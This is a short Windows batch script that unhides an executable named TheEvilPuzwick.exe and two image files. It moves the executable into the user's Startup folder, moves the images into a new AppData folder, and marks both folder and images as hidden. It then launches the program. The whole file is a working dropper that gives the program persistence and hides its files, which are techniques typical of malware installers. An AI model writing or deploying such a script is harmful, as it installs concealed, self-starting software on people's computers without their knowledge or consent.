@echo off

if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\TheEvilPuzwick.exe" GOTO:only_run

attrib -h TheEvilPuzwick.exe
attrib -h puzwick_ico.png
attrib -h puzwick.png

move TheEvilPuzwick.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

mkdir "%appdata%\TheEvilPuzwick"
move puzwick_ico.png "%appdata%\TheEvilPuzwick"
move puzwick.png "%appdata%\TheEvilPuzwick"

attrib +h "%appdata%\TheEvilPuzwick"
attrib +h "%appdata%\TheEvilPuzwick\puzwick_ico.png"
attrib +h "%appdata%\TheEvilPuzwick\puzwick.png"

:only_run
start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\TheEvilPuzwick.exe"